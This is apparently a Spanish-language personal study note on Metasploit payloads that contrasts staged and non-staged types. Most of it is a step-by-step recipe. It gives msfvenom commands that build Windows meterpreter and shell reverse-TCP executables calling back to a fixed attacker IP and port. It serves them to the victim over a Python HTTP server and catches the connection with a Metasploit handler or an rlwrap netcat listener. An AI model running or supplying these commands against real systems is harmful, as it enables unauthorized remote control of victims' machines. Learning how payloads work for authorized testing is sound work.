
----
- Tags: #Payloads #Staged #Non-Staged
----

> **Payload Staged**: Es un tipo de payload que se **divide en dos** **o más etapas**. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.

**Un ejemplo del Staged es el siguiente:**
```Zsh
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=192.168.111.45 LPORT=4646 -f exe -o reverse.exe
```
- Con este comando obtendríamos un ejecutable que debemos transferir a la maquina víctima 
**Lo compartimos a nivel de red:**
```python
python -m http.server 1212
```
- Para este punto ya deberíamos tener comprometida la maquina eh ingresar por el navegador por la ip del atacante por el puerto 1212 y descargar la reverse.exe
**Iniciamos Metasploit**
```zsh
msfdb run
```
**En el interprete ingresamos los siguientes comandos:**
```Metasploit
>>use exploit/multi/handler
>>set payload windows/x64/meterpreter/reverse_tcp
>>show options
>>set LHOST 192.168.111.45
>>set LPORT 4646
>>run
```
- En este punto ponemos a correr el archivo reverse.exe en la maquina victima para obtener acceso.

> **Payload Non-Staged**: Es un tipo de payload que se envía como **una sola entidad** y **no se divide en múltiples etapas**. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.

**Ejemplo de Non-Staged:**
```Metasploit
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=192.168.111.45 LPORT=4646 -f exe -o shell.exe
```

**Compartimos un servidor HTTP:**
```python
python3 -m http.server 1212
```

**Descargamos la shell por el puerto compartido y corremos metasploit:**
```Metasploit
msfdb run
>>use exploit/multi/handler
>>set payload windows/x64/meterpreter_reverse_tcp
>>show options
>>set LHOST 192.168.111.45
>>set LPORT 4646
>>run
```


- **TIPS: Tambien lo podemos realizar a través de ncat realizando casi el mismo proceso, solo en el comando hay que cambiar el meterpreter por shell**
  ejemplo:

 ```
 msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=192.168.111.45 LPORT=4646 -f exe -o shell.exe
 ```

   **Compartimos el archivo por el puerto 1212**
```python
python3 -m http.server 1212
```

- **Descargamos el archivo compartido por el puerto 1212 por la dirección 192.168.111.45:1212 en la maquina victima**
  
 **Nos ponemos en escucho con nc por el puerto 4646**
 ```zsh
 rlwrap nc -nlvp 4646
```

- Luego ejecutamos el archivo .exe en la maquina victima para poder tomar control de ella por nuestra shell ;)
- rlwrap nos permite realizar comandos como ctrl+l para limpiar y demas.
